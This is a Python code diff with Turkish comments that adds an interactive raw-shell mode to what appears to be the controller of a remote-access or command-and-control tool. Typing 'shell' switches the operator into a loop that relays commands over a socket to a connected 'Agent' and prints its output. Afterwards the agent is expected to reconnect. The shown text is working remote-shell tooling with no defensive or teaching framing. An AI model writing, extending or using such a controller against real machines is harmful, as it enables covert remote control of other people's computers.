@@ -159,6 +159,80 @@ class Handler(BaseHandler):
             print(f"[!] Veri alma hatası: {e}")
             return ""
 
+    def start_shell_mode(self):
+        """Raw socket üzerinden shell etkileşimini yönetir."""
+        print("-" * 50)
+        print("[*] Raw Shell Moduna geçildi.")
+        print("[*] Çıkış için 'exit' yazıp Enter'layın.")
+        print("-" * 50)
+        
+        stop_event = threading.Event()
+        
+        def recv_loop():
+            """Socket -> STDOUT"""
+            while not stop_event.is_set():
+                try:
+                    if not self.client_sock: break
+                    data = self.client_sock.recv(1024)
+                    if not data:
+                        stop_event.set()
+                        break
+                    # Gelen veriyi direkt ekrana bas
+                    print(data.decode('utf-8', errors='replace'), end='', flush=True)
+                except Exception:
+                    stop_event.set()
+                    break
+
+        t = threading.Thread(target=recv_loop, daemon=True)
+        t.start()
+        
+        try:
+            while not stop_event.is_set():
+                # Kullanıcıdan veri al (sys.stdin.readline() satır bazlı okuma yapar)
+                try:
+                    cmd = sys.stdin.readline()
+                except EOFError:
+                    break
+                
+                if not cmd: break
+                
+                if cmd.strip() == "exit":
+                    # Çıkış sinyali gönder
+                    if self.client_sock:
+                        try:
+                            self.client_sock.send(b"exit_shell_mode_now")
+                        except:
+                            pass
+                    stop_event.set()
+                    break
+                
+                # Veriyi gönder
+                if self.client_sock:
+                    try:
+                        self.client_sock.send(cmd.encode('utf-8'))
+                    except:
+                        stop_event.set()
+                        break
+                
+        except KeyboardInterrupt:
+            if self.client_sock:
+                try:
+                    self.client_sock.send(b"exit_shell_mode_now")
+                except:
+                    pass
+            stop_event.set()
+            
+        print("\n[*] Shell modundan çıkıldı. Bağlantı yenileniyor...")
+        # Bağlantıyı kapat (Agent reconnect atacak)
+        if self.client_sock:
+            try:
+                self.client_sock.close()
+            except:
+                pass
+            self.client_sock = None
+            self.session_id = None # Session düştü
+
+
     def interactive_session(self):
         """Basit interaktif komut satırı."""
         print("-" * 50)
@@ -213,8 +287,21 @@ class Handler(BaseHandler):
 
                 # Komutu gönder
                 self.send_data(cmd)
+
+                # Özellik 2.3: Shell Spawning
+                if cmd.strip().lower() == "shell":
+                    # Önce "Shell başlatıldı" mesajını bekle
+                    response = self.recv_data()
+                    print(response)
+                    
+                    if "[+]" in response:
+                         self.start_shell_mode()
+                         # Shell modundan dönünce loop'tan çık (yeni bağlantı beklenecek)
+                         break
+                    else:
+                        continue
                 
-                # Cevabı bekle
+                # Normal komut cevabı bekle
                 response = self.recv_data()
                 if response:
                     print(response)
